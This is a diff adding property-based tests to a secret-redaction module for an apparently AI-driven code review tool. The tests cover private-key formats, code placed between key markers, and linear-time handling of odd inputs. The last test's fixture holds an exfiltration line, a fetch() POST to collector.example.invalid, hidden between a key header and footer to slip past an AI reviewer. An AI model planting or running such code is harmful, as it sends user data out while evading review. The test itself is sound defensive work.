@@ -44,6 +44,7 @@ import string
 import sys
 import tempfile
 import threading
+import time
 import unittest
 from dataclasses import replace
 from pathlib import Path
@@ -529,6 +530,43 @@ FILLER = st.text(alphabet=string.ascii_letters + " ", max_size=30)
 # Text with no digits, '@', '/', '-', '_' or upper case cannot form any of
 # the redacted shapes, so it must pass through untouched.
 SAFE_TEXT = st.text(alphabet=string.ascii_lowercase + " .,;:!?()'\"\n", max_size=300)
+# Private keys: the kinds of header, and bodies of full 64-character base64
+# lines and a last line of any length, with padding. No digits, so a line
+# that survives redaction can never look like a card number.
+KEY_KINDS = st.sampled_from(["", "RSA ", "EC ", "DSA ", "OPENSSH ", "ENCRYPTED "])
+KEY_LINE = st.text(alphabet=string.ascii_letters + "+/", min_size=64, max_size=64)
+KEY_LAST_LINE = st.builds(
+    lambda line, pad: line + pad, st.text(alphabet=string.ascii_letters + "+/", min_size=1, max_size=64), st.sampled_from(["", "=", "=="])
+)
+KEY_BODIES = st.builds(lambda full, last: [*full, last], st.lists(KEY_LINE, max_size=3), KEY_LAST_LINE)
+
+
+def key_block(kind: str, lines: list[str], between: str, gap: str = "") -> str:
+    """A key from its header to its footer, with between before each line
+    and the footer, and gap right after the header."""
+    return f"-----BEGIN {kind}PRIVATE KEY-----{gap}" + "".join(between + line for line in [*lines, f"-----END {kind}PRIVATE KEY-----"])
+
+
+ENCRYPTED_HEADERS = "\nProc-Type: 4,ENCRYPTED\nDEK-Info: AES-128-CBC,3F17F5316E2BAC89\n"
+# How a key shows up in a diff or a file: the text before its header, the
+# header to the footer, and the text after the footer.
+KEY_EMBEDDINGS: dict[str, Callable[[str, list[str]], tuple[str, str, str]]] = {
+    "pem file": lambda kind, lines: ("", key_block(kind, lines, "\n"), "\n"),
+    "added lines": lambda kind, lines: ("+", key_block(kind, lines, "\n+"), "\n"),
+    "removed lines": lambda kind, lines: ("-", key_block(kind, lines, "\n-"), "\n"),
+    "windows lines": lambda kind, lines: ("", key_block(kind, lines, "\r\n"), "\r\n"),
+    "json string": lambda kind, lines: ('{"private_key": "', key_block(kind, lines, "\\n"), '\\n"}'),
+    "split string": lambda kind, lines: ('key = "', key_block(kind, lines, '\\n" +\n+  "'), '\\n";'),
+    "string list": lambda kind, lines: ('["', key_block(kind, lines, '", "'), '"]'),
+    "one line": lambda kind, lines: ("KEY=", key_block(kind, lines, " "), " "),
+    "encrypted": lambda kind, lines: ("", key_block(kind, lines, "\n", gap=ENCRYPTED_HEADERS), "\n"),
+}
+# Lines of code: short words and punctuation no key holds.
+CODE_LINES = st.lists(
+    st.tuples(st.text(alphabet=string.ascii_lowercase, min_size=1, max_size=12), st.sampled_from(list("().;{}:<>!?&|*%#[]"))),
+    min_size=1,
+    max_size=5,
+).map(lambda parts: "".join(word + mark for word, mark in parts))
 PATHS = st.one_of(
     st.from_regex(r"(src/lib|scripts|tests|docs|migrations|\.github/workflows)/[a-z]{1,8}\.(ts|py|md|sql|yml)", fullmatch=True),
     st.sampled_from(["pnpm-lock.yaml", "public/logo.png", ".env", "data/pilot.csv", "build/app.js", "feature.svg"]),
@@ -729,6 +767,55 @@ class RedactionProperties(unittest.TestCase):
         for snippet in snippets:
             self.assertEqual(review.redact_sensitive(snippet), (snippet, 0), snippet)
         self.assertEqual(review.redact_sensitive((REPO_ROOT / "src/lib/honesty.ts").read_text())[1], 0)
+
+    @PBT
+    @given(KEY_KINDS, KEY_BODIES, st.sampled_from(sorted(KEY_EMBEDDINGS)), SAFE_TEXT, SAFE_TEXT)
+    def test_a_private_key_goes_whole_however_it_is_written(
+        self, kind: str, lines: list[str], embedding: str, before: str, after: str
+    ) -> None:
+        # A key as a PEM file, as added or removed diff lines, as a JSON or
+        # JS string with \n escapes, split over string literals, flattened
+        # with spaces, or encrypted, between any text: header to footer
+        # becomes one marker, and nothing around it changes.
+        lead, block, trail = KEY_EMBEDDINGS[embedding](kind, lines)
+        out, count = review.redact_sensitive(before + lead + block + trail + after)
+        self.assertEqual((out, count), (before + lead + review.redaction_marker("private key") + trail + after, 1))
+        self.assertEqual(review.redact_sensitive(out), (out, 0))
+
+    @PBT
+    @given(KEY_KINDS, st.lists(KEY_LINE, max_size=3), KEY_BODIES, CODE_LINES, st.sampled_from(["", "+", "-"]))
+    def test_code_between_key_markers_always_reaches_the_model(
+        self, kind: str, above: list[str], below: list[str], code: str, marker: str
+    ) -> None:
+        # Code between a key's header and footer is no key, so it is never
+        # redacted, nor is anything after it; the base64 lines between the
+        # header and the code still are.
+        lines = [f"-----BEGIN {kind}PRIVATE KEY-----", *above, code, *below, f"-----END {kind}PRIVATE KEY-----"]
+        text = "\n".join(marker + line for line in lines)
+        out, _count = review.redact_sensitive(text)
+        tail = "\n".join(marker + line for line in [code, *below, lines[-1]])
+        self.assertEqual(out, marker + review.redaction_marker("private key") + "\n" + tail)
+
+    def test_odd_key_bodies_take_linear_time(self) -> None:
+        # Bodies that are almost a key, and are long, with no footer or one
+        # that never comes: each is redacted at most once and quickly.
+        header = "-----BEGIN PRIVATE KEY-----"
+        bodies = [
+            " " * 60_000,
+            "+" * 60_000,
+            ("a" * 15 + " ") * 4_000,
+            "\\n" * 30_000,
+            "\\" * 60_000,
+            "- " * 30_000,
+            ("\n" + "A" * 64) * 900 + "\n(",
+            ("\nDEK-Info: AES-128-CBC," + "F" * 40) * 900,
+            "\n----END PRIVATE KEY----" * 2_400,
+        ]
+        for body in bodies:
+            started = time.monotonic()
+            _out, count = review.redact_sensitive(header + body)
+            self.assertEqual(count, 1)
+            self.assertLess(time.monotonic() - started, 2.0, body[:40])
 
     def test_url_credentials_and_private_keys(self) -> None:
         out, count = review.redact_sensitive(
@@ -1278,6 +1365,22 @@ class PromptTests(unittest.TestCase):
         self.assertIn("[REDACTED email]", request.user)
         self.assertRegex(request.user, rf"- modified \.env \(\+\d+ -0\): not sent, {review.SECRET_FILE_REASON}\n")
         self.assertRegex(request.user, r"- modified pnpm-lock\.yaml \(\+\d+ -0\): not sent, lockfile\n")
+
+    def test_code_between_key_markers_reaches_the_prompt(self) -> None:
+        # A fixture that opens a key header in one constant and closes it in
+        # another, with code between them. The code is no key, so the model
+        # sees it, and a clean answer approves only what it saw.
+        hidden = (
+            "@@ -0,0 +1,5 @@\n"
+            "+export const TEST_KEY = `-----BEGIN PRIVATE KEY-----\n"
+            "+`;\n"
+            "+fetch('https://collector.example.invalid/x', { method: 'POST', body: JSON.stringify(answers) });\n"
+            "+export const TEST_KEY_END = `\n"
+            "+-----END PRIVATE KEY-----`;\n"
+        )
+        request = self.build(make_pr(changed_files=1), [make_file("src/lib/vault-fixture.ts", hidden, "added")])
+        self.assertIn("+fetch('https://collector.example.invalid/x', { method: 'POST', body: JSON.stringify(answers) });", request.user)
+        self.assertIn("+export const TEST_KEY = `[REDACTED private key]\n+`;", request.user)
 
 
 # --- whole runs with fakes -----------------------------------------------------------------
